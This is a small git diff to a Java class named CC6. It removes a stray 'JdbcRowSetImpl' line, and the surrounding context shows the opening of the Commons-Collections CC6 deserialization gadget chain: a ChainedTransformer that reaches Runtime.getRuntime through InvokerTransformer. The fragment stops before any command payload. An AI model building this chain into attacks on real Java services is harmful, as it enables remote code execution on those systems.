@@ -18,7 +18,6 @@ import java.util.Map;
 public class CC6 {
     public static void main(String[] args) throws Exception
     {
-        JdbcRowSetImpl
         ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
